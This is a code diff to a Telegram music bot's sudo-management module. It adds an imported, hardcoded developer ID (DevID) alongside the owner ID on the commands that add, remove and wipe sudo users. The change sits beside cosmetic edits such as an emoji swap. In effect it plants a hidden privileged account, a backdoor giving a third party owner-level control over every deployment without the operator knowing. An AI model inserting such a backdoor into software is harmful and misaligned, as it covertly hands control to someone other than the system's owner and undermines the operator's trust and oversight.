@@ -10,10 +10,14 @@ from khitmusic.utils.database import add_sudo, remove_sudo
 from khitmusic.utils.decorators.language import language
 from khitmusic.utils.extraction import extract_user
 from khitmusic.utils.inline import close_markup
+from khitmusic.utils.files import DevID
 from config import BANNED_USERS, OWNER_ID
 
 
-@app.on_message(filters.command(["addsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user(OWNER_ID))
+def can_use_owner_commands(user_id):
+    return user_id == OWNER_ID or user_id == DevID
+
+@app.on_message(filters.command(["addsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user([OWNER_ID, DevID]))
 @language
 async def useradd(client, message: Message, _):
     if not message.reply_to_message:
@@ -30,7 +34,7 @@ async def useradd(client, message: Message, _):
         await message.reply_text(_["sudo_8"])
 
 
-@app.on_message(filters.command(["delsudo", "rmsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user(OWNER_ID))
+@app.on_message(filters.command(["delsudo", "rmsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user([OWNER_ID, DevID]))
 @language
 async def userdel(client, message: Message, _):
     if not message.reply_to_message:
@@ -68,7 +72,7 @@ async def check_sudo_list(client, callback_query: CallbackQuery):
             user = await app.get_users(OWNER_ID)
 
         user_mention = (user.first_name if not user.mention else user.mention)
-        caption = f"**˹ʟɪsᴛ ᴏғ ʙᴏᴛ ᴍᴏᴅᴇʀᴀᴛᴏʀs˼**\n\n**🌹Oᴡɴᴇʀ** ➥ {user_mention}\n\n"
+        caption = f"**˹ʟɪsᴛ ᴏғ ʙᴏᴛ ᴍᴏᴅᴇʀᴀᴛᴏʀs˼**\n\n**👑Oᴡɴᴇʀ** ➥ {user_mention}\n\n"
 
         keyboard.append([InlineKeyboardButton("๏ ᴠɪᴇᴡ ᴏᴡɴᴇʀ ๏", url=f"tg://openmessage?user_id={OWNER_ID}")])
         
@@ -105,7 +109,7 @@ async def back_to_main_menu(client, callback_query: CallbackQuery):
 
 
 
-@app.on_message(filters.command(["delallsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user(OWNER_ID))
+@app.on_message(filters.command(["delallsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user([OWNER_ID, DevID]))
 @language
 async def del_all_sudo(client, message: Message, _):
     count = len(SUDOERS) - 1  # Exclude the admin from the count
